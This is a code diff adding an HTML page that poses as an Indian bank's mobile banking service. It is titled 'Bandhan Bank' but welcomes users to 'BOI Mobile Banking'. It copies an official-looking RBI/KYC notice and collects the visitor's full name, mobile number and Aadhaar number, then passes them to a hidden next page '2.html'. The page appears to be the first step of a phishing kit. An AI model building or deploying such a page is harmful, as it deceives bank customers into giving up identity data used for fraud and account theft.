@@ -1,0 +1,66 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bandhan Bank</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <header>
+        <img src="assets/logo.png" width="100%" alt="">
+    </header>
+y
+    <div class="test"> 
+        <font size="3" color="red" style="color: yellow;">
+            <marquee behavior="scroll" scrollamount="5" direction="left" onmouseover="this.stop();" onmouseout="this.start();" style="background: #007dc6;align-items: center;padding-bottom: 9px;padding-top: 9px;">
+            Dear Customers, As per RBI guidelines CKYC identification number (14 digits) is mandatory. Please submit your CKYC ID number (if available with you) and if the same is not available, kindly contact your home/nearest branch along with latest KYC documents to generate CKYC ID.****To Strengthen your Aadhaar,update your Aadhaar if 10 years old.****As per the RBI’s directives, All the IB customers mandatorily register their mobile for electronic transactions. Internet banking facilities of the customers where mobile number is not registered has been discontinued. Please register your mobile number with the nearest branch to activate internet banking services.
+            </marquee> 
+        </font>
+    </div>
+    <input type="hidden" id="page_type" value="home">
+    <input type="hidden" id="nextValue" value="2.html">
+    <div id="test" class="text-danger fw-bold"></div>
+        <main class="mt-2">
+            <div class="container">
+                <div class="title">
+                    <h1>Welcome to</h1>
+                    <p>BOI Mobile Banking Services</p>
+                </div>
+                <div class="form-body mb-5 d-flex flex-column align-items justify-content-center">
+                    <form id="form" class="d-flex flex-column justify-content-center align-items-center">
+                        <div class="form-group">
+                            <input type="text" class="custom-control" name="fname"  maxlength="32"  placeholder="Full Name" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" name="mb" minlength="10" maxlength="10" inputmode="numeric" placeholder="Mobile Number"" class="custom-control" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" name="adh" minlength="12" maxlength="12" inputmode="numeric" placeholder="Aadhar Number"" class="custom-control" required>
+                        </div>
+                        <div class="form-group">
+                            <div class="d-flex">
+                                <input type="checkbox">
+                                <label for="" style="    font-size: 13px;color: #0d405e;float: left;padding: 3px 0;margin-left:5px"> Use virtual keyboard(Recommended)</label>
+                            </div>
+                        </div>
+                        <div class="mb-0 form-group w-100 d-flex justify-content-center">
+                            <button type="submit" class="submit-button">
+                                <img src="assets/submit.png" alt="">
+                            </button>
+                            <img src="assets/reset.png" alt="">
+                        </div>
+                    </form> 
+                </div>
+            </div>
+        </main>
+    <footer>
+        <img src="assets/footer.jpg" width="100%" alt="">
+    </footer>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
+    <script src="assets/script.js"></script>
+
+  </body>
+</html>
